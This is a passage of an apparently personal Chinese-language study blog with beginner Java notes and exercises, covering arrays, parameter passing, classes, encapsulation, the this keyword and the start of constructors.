class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">target</span> <span class="hljs-operator">=</span> <span class="hljs-number">5</span>;<br><br>         <span class="hljs-type">boolean</span> <span class="hljs-variable">flag</span> <span class="hljs-operator">=</span> equalWhat(arr, target);<br><br>        System.out.println(flag);<br>        &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equalWhat</span><span class="hljs-params">(<span class="hljs-type">int</span>[] arr, <span class="hljs-type">int</span> target)</span> &#123;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; arr.length; i++) &#123;<br><br>            <span class="hljs-keyword">if</span> (arr[i] == target)&#123;<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>练习：复制数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">int</span>[] arr = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span>,<span class="hljs-number">9</span>&#125;;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">from1</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">to1</span> <span class="hljs-operator">=</span> <span class="hljs-number">8</span>;<br><br>         <span class="hljs-type">int</span>[] flag = copyWhat(arr, from1, to1);<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; flag.length; i++) &#123;<br><br>            System.out.println(flag[i]);<br><br>        &#125;<br><br>        &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span>[] copyWhat(<span class="hljs-type">int</span>[] arr1, <span class="hljs-type">int</span> from, <span class="hljs-type">int</span> to) &#123;<br><br>        <span class="hljs-type">int</span>[] arr2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">int</span>[to - from];<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> from, j = <span class="hljs-number">0</span>; i &lt; to &amp;&amp; j &lt; arr2.length; i++ , j++) &#123;<br><br>             arr2[j] = arr1[i];<br>        &#125;<br>        <span class="hljs-keyword">return</span> arr2;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>方法的内存</p><ul><li>基本数据类型：</li></ul><p>整数类型，浮点数类型，布尔类型，字符类型(数据值存储在自己的空间中)</p><ul><li>引用数据类型</li></ul><p>除了基本数据类型的其它所有类型(变量中存储的是地址值)。</p><p><img src="/img/javalearn40.png" alt="javalearn40"></p><p>方法传递基本数据类型的内存原理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">num1</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;<br><br>        System.out.println(<span class="hljs-string">&quot;调用change方法前值为：&quot;</span> + num1);<br><br>        change(num1);<br><br>        System.out.println(<span class="hljs-string">&quot;调用change方法后值为：&quot;</span> + num1);<br><br>        &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">change</span><span class="hljs-params">(<span class="hljs-type">int</span> numwhat)</span> &#123;<br><br>         numwhat = <span class="hljs-number">200</span>;<br><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">//结果：</span><br><span class="hljs-number">100</span><br><span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><p>原因参考：</p><p><img src="/img/javalearn41.png" alt="javalearn41"></p><p>当然，如果想通过调用<code>change</code>方法将<code>num</code>的值改变，可以：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">num1</span> <span class="hljs-operator">=</span> <span class="hljs-number">100</span>;<br><br>        System.out.println(<span class="hljs-string">&quot;调用change方法前值为：&quot;</span> + num1);<br><br>         num1 = change(num1);<br><br>        System.out.println(<span class="hljs-string">&quot;调用change方法后值为：&quot;</span> + num1);<br><br>        &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">change</span><span class="hljs-params">(<span class="hljs-type">int</span> numwhat)</span> &#123;<br><br>         numwhat = <span class="hljs-number">200</span>;<br><br>        <span class="hljs-keyword">return</span> numwhat;<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">//结果：</span><br><span class="hljs-number">100</span><br><span class="hljs-number">200</span><br></code></pre></td></tr></table></figure><p>如果对于引用数据类型：传递引用数据类型时。传递的是地址值，形参的改变会影响实际参数的值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">int</span>[] arr1 = &#123;<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>&#125;;<br><br>        System.out.println(<span class="hljs-string">&quot;调用change方法前值为：&quot;</span> + arr1[<span class="hljs-number">1</span>]);<br><br>        change(arr1);<br><br>        System.out.println(<span class="hljs-string">&quot;调用change方法后值为：&quot;</span> + arr1[<span class="hljs-number">1</span>]);<br><br>        &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">change</span><span class="hljs-params">(<span class="hljs-type">int</span>[] numwhat)</span> &#123;<br><br>         numwhat[<span class="hljs-number">1</span>] = <span class="hljs-number">200</span>;<br><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>&#125;<br><span class="hljs-comment">//结果：</span><br><span class="hljs-number">20</span><br><span class="hljs-number">200</span><br></code></pre></td></tr></table></figure><h4 id="综合练习部分"><a href="#综合练习部分" class="headerlink" title="综合练习部分"></a>综合练习部分</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//卖飞机票</span><br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">bianliang1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br><br>        <span class="hljs-type">Scanner</span> <span class="hljs-variable">sc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(System.in);<br><br>        System.out.println(<span class="hljs-string">&quot;请输入当前月份：&quot;</span>);<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">month</span> <span class="hljs-operator">=</span> sc.nextInt();<br><br>        System.out.println(<span class="hljs-string">&quot;请输入目标机票：&quot;</span>);<br><br>        <span class="hljs-type">String</span> <span class="hljs-variable">type</span> <span class="hljs-operator">=</span> sc.next();<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">expensive</span> <span class="hljs-operator">=</span> <span class="hljs-number">1000</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">cheap</span> <span class="hljs-operator">=</span> <span class="hljs-number">500</span>;<br><br>        <span class="hljs-type">int</span> <span class="hljs-variable">money</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<br><br>        <span class="hljs-keyword">if</span> (type == <span class="hljs-string">&quot;头等舱&quot;</span>) &#123;<br><br>            money = expensive;<br><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            money = cheap;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-number">5</span> &lt;= month &amp;&amp; month &lt;= <span class="hljs-number">10</span>) &#123;<br><br>            System.out.println(<span class="hljs-string">&quot;芜湖！目前是淡季，机票价格五折！&quot;</span>);<br><br>            <span class="hljs-type">double</span> <span class="hljs-variable">cost</span> <span class="hljs-operator">=</span> money * <span class="hljs-number">0.5</span>;<br><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;芜湖！目前是旺季，机票不打折&quot;</span>);<br><br>            <span class="hljs-type">double</span> <span class="hljs-variable">cost</span> <span class="hljs-operator">=</span> money;<br>        &#125;<br><br>        System.out.println(<span class="hljs-string">&quot;请支付&quot;</span> + money + <span class="hljs-string">&quot;元&quot;</span>);<br><br><br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p>唉，看了标准答案，感觉我像脑残</p><p>P74 - P81</p><h3 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h3><h4 id="面向对象介绍"><a href="#面向对象介绍" class="headerlink" title="面向对象介绍"></a>面向对象介绍</h4><p>获取&#x2F;设计已有对象并使用</p><h4 id="设计对象并使用"><a href="#设计对象并使用" class="headerlink" title="设计对象并使用"></a>设计对象并使用</h4><ul><li>类和对象</li></ul><p>类：对象共同特征的描述</p><p>对象：真实存在的具体东西</p><p>java中，必须先设计类，才能获得对象</p><ul><li>如何定义类</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> class 类名&#123;<br><span class="hljs-number">1.</span>成员变量(代表属性，一般是名词)<br><span class="hljs-number">2.</span>成员方法(代表行文，一般是动词)<br><span class="hljs-number">3.</span>构造器<br><span class="hljs-number">4.</span>代码块<br><span class="hljs-number">5.</span>内部类<br>&#125;<br><span class="hljs-comment">//比如：</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Phone</span> &#123;<br>    <span class="hljs-comment">//属性</span><br>    String Name;<br><br>    <span class="hljs-type">double</span> Price;<br>    <span class="hljs-comment">//方法</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">call</span><span class="hljs-params">()</span>&#123;&#125;<br>        <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">playGame</span><span class="hljs-params">()</span>&#123;&#125;    <br>    &#125;    <br></code></pre></td></tr></table></figure><ul><li>如何得到类的对象</li></ul><p>类名 对象名 &#x3D; new 类名();</p><p>Phone p &#x3D; new Phone();</p><ul><li>如何使用对象</li></ul><p>访问属性：对象名.成员变量</p><p>访问行为：对象名.方法名</p><ul><li>定义类的注意事项</li></ul><p>用来描述一类事物的类，专业叫做：<code>javabean</code>类。在该类中，不写<code>main</code>方法。</p><p>编写<code>main</code>方法的类叫测试类。</p><p>一个java文件中可以定义多个<code>class</code>类，但只能有一个类是<code>public</code>修饰。而且<code>public</code>修饰的类名必须是代码文件名。不过实际开发中建议一个文件定义一个<code>class</code>类。</p><p>成员变量的完整定义格式是：修饰符 数据类型 变量名称 &#x3D; 初始化值; 一般无需指定初始化值，存在默认值。</p><p><img src="/img/jajvalearn42.png" alt="jajvalearn42"></p><p>练习：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//girlFriend类</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">girlFriend</span> &#123;<br>    String name;<br><br>    <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sleep</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;sleeping&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;eating&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//testgirl</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">testgril</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">girlFriend</span> <span class="hljs-variable">hername</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">girlFriend</span>();<br><br>        hername.age = <span class="hljs-number">21</span>;<br>        hername.name = <span class="hljs-string">&quot;what?&quot;</span>;<br>        hername.eat();<br>        hername.sleep();<br>        System.out.println(hername.age);<br>        System.out.println(hername.name);<br><br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>开发中类的设计</li></ul><h4 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h4><p>面向对象三大特征：封装，继承，多态。</p><p>封装：对象代表什么，就得封装对应的数据，并提供数据对应的行为。</p><p>告诉我们，如何正确设计对象的属性和方法。</p><p>已经设计好的类，其中类的内部细节被隐藏，而通过公共接口提供对这些细节的访问和修改。这有助于实现类的安全性和灵活性。</p><h4 id="private关键字"><a href="#private关键字" class="headerlink" title="private关键字"></a>private关键字</h4><ul><li>是一个权限修饰符</li><li>可以修饰成员(成员变量和成员方法)</li><li>被private修饰的成员只能在本类中才能访问</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GirlFriend</span> &#123;<br><span class="hljs-keyword">private</span> String name;<br><span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><span class="hljs-keyword">private</span> String gender;<br><br>&#125;<br><span class="hljs-type">GirlFriend</span> <span class="hljs-variable">gf1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">GirlFriend</span>();<br>gf1.age = <span class="hljs-number">18</span>;<br><span class="hljs-comment">//这时会报错，因为不能在其他类里调用age</span><br></code></pre></td></tr></table></figure><p><img src="/img/javalearrn42.png" alt="javalearrn42"></p><p>可以这样修改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//girlwhat.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">girlwhat</span> &#123;<br>        <span class="hljs-keyword">private</span> String name;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String n)</span>&#123;<br>            name = n;<br>        &#125;<br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>&#123;<br>            <span class="hljs-keyword">return</span> name;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span>&#123;<br>            <span class="hljs-keyword">if</span> (a &gt; <span class="hljs-number">18</span> &amp;&amp; a &lt; <span class="hljs-number">30</span>)&#123;<br>                age = a;<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;非法参数&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span>&#123;<br>            <span class="hljs-keyword">return</span> age;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sleep</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;sleeping&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">eat</span><span class="hljs-params">()</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;eating&quot;</span>);<br>        &#125;<br><br>&#125;<br><span class="hljs-comment">//testgirl.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">testgril</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">girlwhat</span> <span class="hljs-variable">hername</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">girlwhat</span>();<br><br>        hername.setName(<span class="hljs-string">&quot;txy&quot;</span>);<br>        <span class="hljs-comment">//hername.getName();</span><br>        System.out.println(hername.getName());<br>        hername.setAge(<span class="hljs-number">18</span>);<br>        System.out.println(hername.getAge());<br>        hername.eat();<br>        hername.sleep();<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="this关键字"><a href="#this关键字" class="headerlink" title="this关键字"></a>this关键字</h4><ul><li>成员变量和局部变量</li></ul><p>对于如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">testtest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<span class="hljs-comment">//这东西是成员变量</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">age</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>; <span class="hljs-comment">//这东西是局部变量</span><br>        System.out.println(age);<br>    &#125;<br>&#125;<br><span class="hljs-comment">//此时遵守就近原则，结果是10</span><br></code></pre></td></tr></table></figure><p><img src="/img/javalearn44.png" alt="javalearn44"></p><p><code>this</code>关键字可以定位到成员变量，也可以通过就近原则：</p><p><img src="/img/javalearn45.png" alt="javalearn45"></p><p>此时输出的都是成员变量。</p><p>所以上面的代码可以进行如下更改：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">girlwhat</span> &#123;<br>        <span class="hljs-keyword">private</span> String name;<br>        <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span>&#123;<br>            <span class="hljs-built_in">this</span>.name = name;<br>        &#125;<br>        <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>&#123;<br>            <span class="hljs-keyword">return</span> name;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span>&#123;<br>            <span class="hljs-keyword">if</span> (age &gt; <span class="hljs-number">18</span> &amp;&amp; age &lt; <span class="hljs-number">30</span>)&#123;<br>                <span class="hljs-built_in">this</span>.age = age;<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                System.out.println(<span class="hljs-string">&quot;非法参数&quot;</span>);<br>            &#125;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span>&#123;<br>            <span class="hljs-keyword">return</span> age;<br>        &#125;<br></code></pre></td></tr></table></figure><p>注意两个<code>get</code>方法，加不加<code>this</code>都行。</p><p>总结：<code>this</code>关键字就是指成员变量(避免和局部变量混淆)。当然也可以通过就近原则避免这个问题。</p><h4 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h4><ul><li>概述：也叫做构造器、构造函数。</li><li>作用：在创建对象时给成员变量进行初始化。</li></ul><p>比如对于：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StudentDemo</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span>&#123;<br><span class="hljs-type">Student</span> <span class="hljs-variable">s1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>();<span class="hljs-comment">//这个空括号表示空参的构造方法</span><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>构造方法的格式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> &#123;<br><br>修饰符 类名(参数) &#123; <br>方法体;<br>&#125;<br>    